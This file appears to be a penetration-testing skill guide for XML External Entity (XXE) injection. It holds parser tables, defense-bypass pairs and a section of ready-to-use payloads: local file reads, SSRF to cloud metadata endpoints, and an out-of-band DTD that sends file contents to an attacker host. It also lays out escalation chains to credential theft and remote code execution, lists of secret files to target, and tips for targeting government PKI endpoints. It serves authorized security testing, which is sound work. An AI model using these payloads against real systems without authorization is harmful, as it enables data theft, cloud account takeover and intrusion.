---
name: xxe
description: XXE testing for external entity injection, file disclosure, and SSRF via XML parsers
depends_on: []
---

# XXE

XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.

## Discovery Signals

Technology fingerprints indicating XXE testing opportunities:

| Signal | Where to Look | Why It Matters |
|--------|---------------|----------------|
| `Content-Type: application/xml` or `text/xml` | Proxy history, API docs | Direct XML parsing endpoint |
| SOAP/WSDL (`?wsdl`, `/ws/`, `/services/`) | URL paths, Burp sitemap | Java/old .NET SOAP stacks default-insecure |
| SAML SSO (ACS endpoint, `/saml/`, `/sso/`) | Auth flows, IdP metadata import | XML parsed before signature verification |
| File upload accepting SVG/DOCX/XLSX/ODT | Upload forms, avatar/profile endpoints | XML embedded inside binary containers |
| RSS/Atom feed import or sitemap processing | CMS admin, SEO tools, web crawlers | Server fetches and parses external XML |
| XSLT transform endpoints (`/transform`, `/render`) | Report generators, PDF/HTML converters | `document()` and extension functions |
| XML-RPC (`/xmlrpc.php`, `/rpc2`) | WordPress, legacy APIs | `system.multicall` + entity processing |
| XMP metadata processing | Image upload with server-side resize | JPEG/PNG XMP sections are XML |
| SpellCheck / document-utility APIs | Office integrations, enterprise apps | Legacy XML protocols, rarely hardened |
| Import-from-URL features (SAML metadata, JWKS) | IAM/SSO config panels | Server-side fetch of attacker-controlled XML |
| `Java/*` or `libxml2` in response headers/errors | Error messages, User-Agent callbacks | Parser fingerprint reveals default-insecure config |
| IDE/build tool project files (pom.xml, .csproj) | Dev tooling supply chain | Client-side XXE via malicious repos |

## Parser Behavior Matrix

| Parser / Library | Language | External Entities Default | Parameter Entities | XInclude | XSLT | Known Bypass |
|-----------------|----------|--------------------------|-------------------|----------|------|--------------|
| DocumentBuilderFactory | Java | ON (pre-JDK8u121) | ON | Separate flag | Via TransformerFactory | `netdoc:`, `jar:` protocols |
| SAXParserFactory | Java | ON | ON | Separate flag | N/A | Same as above |
| Xerces-J | Java | ON | ON | ON if configured | N/A | External DTD subset |
| DOM4J SAXReader | Java | ON | ON | Depends on underlying parser | N/A | setFeature often missed |
| libxml2 (<2.9) | C/multi | ON | ON | ON | Via libxslt | Upgrade to 2.9+ disables by default |
| libxml2 (>=2.9) | C/multi | OFF | OFF | Still needs explicit disable | Via libxslt | XInclude may remain on |
| lxml (Python) | Python | OFF (defused default) | OFF | OFF | ON if XSLT used | `resolve_entities=True` re-enables |
| SimpleXML / DOMDocument | PHP | ON (libxml2-dependent) | ON | ON | Via XSLTProcessor | `LIBXML_NOENT` flag, `expect://` |
| MSXML 6.0 | .NET | OFF | OFF | N/A | Via XslCompiledTransform | `ProhibitDtd=false` re-enables |
| XmlDocument (<4.5.2) | .NET | ON | ON | N/A | N/A | XmlResolver not null |
| NSXMLParser | macOS/iOS | ON | ON | N/A | N/A | `setShouldResolveExternalEntities` |
| Go `encoding/xml` | Go | No entity resolution | N/A | N/A | N/A | Safe by design, but custom parsers may not be |
| xml.etree.ElementTree | Python | No entity resolution | N/A | N/A | N/A | Safe, but `xml.sax` and `xml.dom.pulldom` are not |

## XXE via File Upload

Formats with embedded XML that parsers process server-side:

| Format | XXE Location | Injection Method | Real-World Report |
|--------|-------------|------------------|-------------------|
| SVG | Root element or `<metadata>` | Inline DTD + entity in `<text>` or `xlink:href` | Shopify SSRF #223203 ($500) |
| DOCX | `word/document.xml` or `_rels/.rels` | Unzip, inject DTD, repackage ZIP | DoD XXE #227880 |
| XLSX | `xl/sharedStrings.xml` or `xl/workbook.xml` | Unzip, inject DTD, repackage ZIP | Common in HR/finance portals |
| PPTX | `ppt/presentation.xml` | Same unzip/inject/rezip pattern | Office upload processors |
| ODT/ODS | `content.xml` | LibreOffice/OpenOffice XML internals | Weblate XLF #232614 |
| JPEG/PNG (XMP) | XMP metadata section | `exiftool -XMP-dc:Description='PAYLOAD' img.jpg` | Informatica avatar XXE #836877 |
| WAV (iXML) | iXML metadata chunk | Embedded XML in binary audio container | WordPress PHP8 XXE #1095645 |
| XLIFF/XLF | Root `<xliff>` element | Standard XML injection in translation files | Weblate #232614 |
| PDF (XMP) | XMP metadata stream | Hex-edit XMP section or use exiftool | PDF generators parsing metadata |
| RSS/Atom | Feed XML body | External DTD in feed document | Feed aggregators, SEO crawlers |
| Sitemap XML | `<urlset>` element | DTD in sitemap served to web crawlers | Semrush #312543, Elastic #1156748 |
| GPX/KML | Root element | Geolocation XML formats with entity support | Map/GPS data importers |

## Blind/OOB XXE Techniques

| Technique | How It Works | When to Use | Example |
|-----------|-------------|-------------|---------|
| External DTD callback | Parameter entity loads attacker DTD; DTD chains file read into HTTP exfil URL | Entity content not reflected in response | `<!ENTITY % dtd SYSTEM "http://atk/evil.dtd"> %dtd;` |
| Error-based extraction | Inject entity into strict-typed field (integer, enum); parser error leaks content | Error messages visible in response | Entity in `operatorId` field -> `parseInt` fails with file content (Twitter SXMP #248668) |
| FTP data exfil | FTP passive mode leaks multi-line file content line-by-line | HTTP exfil truncates at newlines | `<!ENTITY % f SYSTEM "ftp://atk:21/%f;">` |
| PHP filter chain | `php://filter/convert.base64-encode/resource=FILE` in entity | PHP backend, need base64 to handle binary/special chars | H1 CTF XXE #1217114 |
| DNS exfil (single-line) | File content as subdomain: `http://%content%.atk.tld/` | Firewall blocks HTTP outbound but allows DNS | Works for hostnames, single-line secrets |
| Nested parameter entities | `%e` defines `%exfil` which fetches URL containing `%f` content | Most common blind XXE pattern | Standard OOB DTD (see Core Payloads) |
| `jar:` protocol (Java) | `jar:http://atk/file.jar!/entry` forces connection + temp file write | Java-only, confirms Java parser | Confirms stack; potential file write |
| XInclude fallback | `<xi:include><xi:fallback>` leaks parse errors | DTD blocked but XInclude enabled | DoD XInclude #997381 |

## Protocol Handler Matrix

| Protocol | OS / Runtime | Capability | Example |
|----------|-------------|------------|---------|
| `file://` | All | Local file read | `file:///etc/passwd`, `file:///c:/windows/win.ini` |
| `http://` | All | SSRF, OOB exfil | `http://169.254.169.254/latest/meta-data/` |
| `https://` | All | SSRF (TLS) | `https://internal-api/admin` |
| `ftp://` | All (if FTP client available) | Multi-line file exfil, port scan | `ftp://atk:21/` with passive mode |
| `gopher://` | Linux (libcurl, older PHP) | Raw TCP (Redis, SMTP, FastCGI) | `gopher://127.0.0.1:6379/_SET%20key%20val` |
| `jar://` | Java | HTTP fetch + temp file write | `jar:http://atk/evil.jar!/file` |
| `netdoc://` | Java (Xerces) | File read (bypasses `file://` block) | `netdoc:///etc/passwd` |
| `php://filter` | PHP | Base64-encode file read, stream wrappers | `php://filter/convert.base64-encode/resource=/etc/passwd` |
| `expect://` | PHP (expect module) | RCE | `expect://id` |
| `data://` | PHP, some others | Inline payload delivery | `data://text/plain;base64,BASE64PAYLOAD` |
| Cloud metadata | AWS/GCP/Azure | Credential theft | `http://169.254.169.254/`, `http://metadata.google.internal/`, `http://169.254.169.254/metadata/identity/oauth2/token` |

## XXE to SSRF Escalation

When you confirm XXE, escalate to internal service access:

1. **Cloud metadata** -- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS), `http://metadata.google.internal/computeMetadata/v1/` (GCP), `http://169.254.169.254/metadata/identity/oauth2/token` (Azure)
2. **Co-located admin services** -- Apache Axis AdminService on `localhost` (PeopleSoft chain: XXE -> SSRF -> Axis service deployment -> RCE, DoD #710654), Solr admin, JMX, Elasticsearch
3. **Internal APIs** -- Docker API (`http://127.0.0.1:2375/version`), Kubernetes kubelet (`http://127.0.0.1:10255/pods`), Redis (`gopher://` if available)
4. **Port scanning** -- Vary target port in entity URL; measure response time or error difference to map open ports
5. **Schema location SSRF** -- `xsi:schemaLocation="ns http://atk/x.xsd"` fires even when DOCTYPE is blocked (DoD #1150799)

## Defense-Bypass Pairs

| Defense | Bypass | Technique |
|---------|--------|-----------|
| DOCTYPE blocked | XInclude injection | `<xi:include href="file:///etc/passwd" parse="text"/>` (DoD #997381) |
| General entities blocked | Parameter entities in external DTD | `<!ENTITY % p SYSTEM "http://atk/evil.dtd"> %p;` (DuckDuckGo #486732) |
| `file://` protocol blocked | `netdoc://` (Java) or `php://filter` (PHP) | Parser-specific protocol aliases |
| Content-Type validation | Filename/Content-Type mismatch | Upload `.png` filename with `image/svg+xml` Content-Type (Shopify #223203) |
| WAF inspects XML body | UTF-16 BOM + encoding | `<?xml version="1.0" encoding="UTF-16"?>` with UTF-16 bytes |
| WAF blocks `<!ENTITY` | UTF-7 encoding | `<?xml version="1.0" encoding="UTF-7"?>` then entity in UTF-7 |
| Entity expansion disabled | XSLT `document()` function | `<xsl:copy-of select="document('file:///etc/passwd')"/>` |
| Inline DTD blocked | External DTD via `SYSTEM` URL | DTD on attacker server defines all entities |
| `xsi:schemaLocation` blocked | `xsi:noNamespaceSchemaLocation` | Alternative attribute, same OOB effect |
| XML rejected entirely | Embed in binary format | XXE in JPEG XMP, WAV iXML, DOCX XML (Informatica #836877, WordPress #1095645) |

## Chain Patterns

| Chain | Starting Point | Escalation Path | Real Example |
|-------|---------------|-----------------|--------------|
| XXE -> File Read -> Credential Theft | XML endpoint | Read `/etc/shadow`, `wp-config.php`, `.env`, SSH keys | Eclipse plugin XXE -> dev SSH keys ($50K, Google #800057344) |
| XXE -> SSRF -> Cloud Takeover | XML endpoint | Entity URL hits cloud metadata -> IAM creds -> full account | Sitemap XXE on Elastic Cloud (#1156748) |
| XXE -> SSRF -> Internal Admin -> RCE | PeopleSoft PSIGW | XXE -> localhost Axis AdminService -> deploy RCE service | DoD PeopleSoft CVE-2017-3548 (#710654) |
| XXE -> SSRF -> Internal Port Scan | XML endpoint | Vary port in entity URL, measure timing/error diff | Shopify SVG -> all 65535 ports reachable (#223203) |
| Upload Bypass -> XXE | File upload | Bypass filetype check -> upload XML -> parser processes it | Starbucks upload bypass + XXE (#500515) |
| LFI -> XXE -> SSRF -> RCE | LFI in PHP | Read source -> find deser sink -> XXE -> internal pickle RCE | H1 CTF 5-stage chain (#416004) |
| SVG XXE -> Stored XSS | SVG upload | SVG with `<script>` served as `image/svg+xml` on same origin | Nextcloud SVG XSS (#894876) |
| Dev-Tooling XXE -> Supply Chain | Malicious repo | Project XML (pom.xml, appengine-web.xml) parsed on IDE open | Google Cloud Tools Eclipse ($50K, #800057344) |

## Core Payloads

### Local File

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r>&xxe;</r>
```

### SSRF

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<r>&xxe;</r>
```

### OOB Parameter Entity

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
```

evil.dtd:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%f;'>">
%e; %exfil;
```

### XInclude (when DOCTYPE blocked)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### Schema Location SSRF (when entities blocked)

```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://a.b/ http://attacker.tld/probe.xsd">
</root>
```

### XSLT Document

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Error-Based (typed field injection)

```xml
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<operation><operatorId>&xxe;</operatorId></operation>
```

Parser tries `parseInt(file_content)` -> error leaks content in message.

### SVG with SSRF

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="http://attacker.tld/probe.jpg" width="1" height="1"/>
</svg>
```

## Special Contexts

### SOAP

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

SOAP services on enterprise stacks (BizTalk, WebLogic, WCF) often use default-insecure parsers. Check `?wsdl` to discover operations and expected XML structure.

### SAML

SAML assertions are XML-signed, but the XML parser runs before signature verification on many stacks. Test ACS endpoints (`/saml/acs`, `/auth/saml/callback`) with DTD probes. Unauthenticated `addSamlProvider`-style methods can create new SAML providers with no certificate, bypassing signature verification entirely (Rocket.Chat #1049375).

### Office Docs (OOXML)

DOCX/XLSX/PPTX are ZIP archives containing XML. Workflow:
1. Create a legitimate document, unzip it
2. Inject DTD + entity into `word/document.xml` (DOCX), `xl/sharedStrings.xml` (XLSX), or `_rels/.rels`
3. Repackage: `cd docx_dir && zip -r ../malicious.docx .`
4. Upload through any Office document import/preview feature

### XML-RPC

WordPress `xmlrpc.php` provides `pingback.ping` (SSRF -- server fetches attacker URL) and `system.multicall` (auth brute-force amplification -- N login attempts in one request, bypasses per-request rate limits). Ruby's `xmlrpc` gem had insecure deserialization via `___class___` field allowing arbitrary class instantiation and RCE (#1189419).

### SVG in Renderers

SVG elements that trigger fetches: `<image xlink:href>`, `<use href>`, `<feImage href>`, `<foreignObject>`, CSS `url()` inside `<style>`, `@import` in `<style>`. Server-side SVG-to-PNG/PDF renderers (ImageMagick, librsvg, Inkscape) process these. Two-`<image>` chain: first points to local file, second to attacker server -- second fires only if first resolves to valid image, creating a file-existence oracle (Shopify #223203).

### Web Crawlers and Sitemap Parsers

Web crawlers fetch and parse XML sitemaps by design. Serve a malicious `sitemap.xml` referenced in `robots.txt`. The crawler's XML parser resolves external entities -> OOB exfil of server files (Elastic Enterprise Search #1156748, Semrush #312543).

## High-Value File Targets

| OS | File | Why |
|----|------|-----|
| Linux | `/etc/passwd` | Confirms file read, enumerates users |
| Linux | `/etc/hostname`, `/proc/self/environ` | Hostname for DNS exfil, env vars for secrets |
| Linux | `/home/*/.ssh/id_rsa` | SSH private keys |
| Linux | `/proc/self/cwd/app/.env` | Application secrets |
| Windows | `C:\Windows\win.ini` | Confirms file read |
| Windows | `\\attacker\share\probe` | NTLM hash leak via SMB (auto-auth on Windows) |
| Java | `WEB-INF/web.xml`, `META-INF/context.xml` | App config, DB credentials, JNDI refs |
| PHP | `wp-config.php`, `.env` | DB creds, auth keys |
| Cloud | `~/.aws/credentials`, `~/.config/gcloud/credentials.db` | Cloud provider secrets |

## Testing Methodology

1. **Inventory consumers** -- Endpoints, upload parsers, background jobs, CLI tools, converters, web crawlers, sitemap processors, third-party SDKs, spell-check APIs, import-from-URL features
2. **Probe XML features systematically** -- Test each independently with OOB callback per DoD #1150799 methodology:
   - DOCTYPE + external entity
   - Parameter entities + external DTD
   - XInclude (`xi:include`)
   - Schema location (`xsi:schemaLocation` and `xsi:noNamespaceSchemaLocation`)
   - XSLT `document()` if transform endpoint
3. **Establish oracle** -- Error shape, length/ETag diffs, OAST callbacks (Burp Collaborator, interactsh). Wait 5+ minutes -- async processors may have multi-minute latency (DoD #1150799 had 30-40s delay)
4. **Fingerprint parser** -- Check `User-Agent` in OOB callback (`Java/1.8.0_144` = default-insecure Java), error messages revealing `libxml2`, `Xerces`, `MSXML`
5. **Escalate** -- File read, SSRF to cloud metadata, SSRF to localhost admin services, protocol wrappers (`netdoc:`, `jar:`, `php://filter`, `expect://`)
6. **Test binary format vectors** -- Inject XXE into JPEG XMP, WAV iXML, DOCX/XLSX XML, SVG; upload each
7. **Re-test after fix** -- XXE fixes commonly block one mechanism (general entities) while leaving others open (parameter entities, XInclude, schema location). Always re-test all vectors after remediation (DuckDuckGo #486732)

## Validation

1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT/schemaLocation)
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence
3. Confirm blind channels with OAST and correlate to the triggering request
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths)
5. Bound impact: exact files/data reached or internal targets proven

## False Positives

- DOCTYPE accepted but entities not resolved and no transclusion reachable
- Filters or sandboxes that emit entity strings literally (no IO performed)
- Mocks/stubs that simulate success without network/file access
- XML processed only client-side (no server parse)
- OOB callback from client-side fetch (browser), not server -- check source IP

## Pro Tips

1. Prefer OAST first -- it is the quietest confirmation and works against blind/async parsers. Use unique subdomains per probe to identify which XML feature triggered the callback
2. When content is sanitized, inject into strict-typed fields (integer, date, enum) to force parser errors that leak entity content in error messages (Twitter SXMP technique, #248668)
3. Probe XInclude and `xsi:schemaLocation` separately -- they often remain enabled after entity resolution is disabled. Test both after every "XXE fix"
4. Aim SSRF at co-located admin services (Axis, JMX, Solr, Redis, Docker API, kubelet, cloud metadata) before external hosts -- localhost bypass is the highest-value escalation
5. In uploads, repackage OOXML/SVG/XMP rather than standalone XML -- many apps parse these implicitly while rejecting raw XML. Use `exiftool` for XMP injection into JPEG/PNG
6. For Java targets, try `netdoc://` and `jar://` when `file://` is blocked. For PHP, try `php://filter/convert.base64-encode` and `expect://`
7. Test background processors separately -- web crawlers, sitemap parsers, RSS importers, and async document converters often use different (weaker) parser settings than the main API
8. When testing file uploads, use Content-Type/filename mismatches: filename `.png` with Content-Type `image/svg+xml` bypasses extension validators while triggering SVG rendering (Shopify #223203)
9. For supply-chain XXE, check if IDE plugins or build tools parse project XML files (`appengine-web.xml`, `pom.xml`, `.csproj`) on open without disabling entities (Google $50K, #800057344)
10. Always re-test after remediation -- use parameter entities (`%ext;`) if general entities (`&ext;`) are blocked, XInclude if DOCTYPE is blocked, and schema location if both are blocked (DuckDuckGo bypass #486732)
11. Run the full XML injection test matrix against every XML-accepting parameter in one shot: (1) classic XXE `<!DOCTYPE>`, (2) parameter entity + external DTD, (3) XInclude, (4) `xsi:schemaLocation`, (5) XPath injection `' or 1=1]`, (6) XSLT injection `<xsl:value-of>`, (7) XML bomb `<!ENTITY a "&b;&b;">` -- one miss reveals which feature the parser left enabled (DoD #997381)
12. Hunt PKI/CA endpoints on enterprise and .gov/.mil targets: enumerate subdomains for `/ca/`, `/pki/`, `/agent/`, `/certsrv/` -- certificate enrollment services accept XML and typically run default-insecure Java/MSXML parsers (DoD #2573567)
13. Generalize SAML XXE to ALL signed/structured auth payloads: SAML, JWT-JWS, Apple App Receipts, Android SafetyNet attestations -- parsers run before signature verification in most stacks (#444756945)
14. When you find XXE in an app using a popular library (Apache POI, libxml2), check the library defaults -- if the library ships insecure, every consumer is vulnerable until they explicitly harden. One library-default audit finding scales to hundreds of targets (#25537)
15. Map endpoints documented as JSON-only -- many still accept `Content-Type: application/xml` or `text/xml` and silently parse it, especially behind document/word-processing/import features (#715949, SpellCheck endpoint)
16. For blind injection when standard channels are blocked: chain alternative exfil -- error-based extraction via typed fields first, then FTP passive mode for multi-line files, then DNS subdomain exfil for single-line secrets. Each channel bypasses different egress filters (#1217114, #248668)

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, disable XInclude, disable schema-location resolution, and disable network access for XML processors and transformers across every code path. One missed path (upload handler, background worker, metadata extractor, spell-checker, SAML processor) re-introduces the full attack surface.
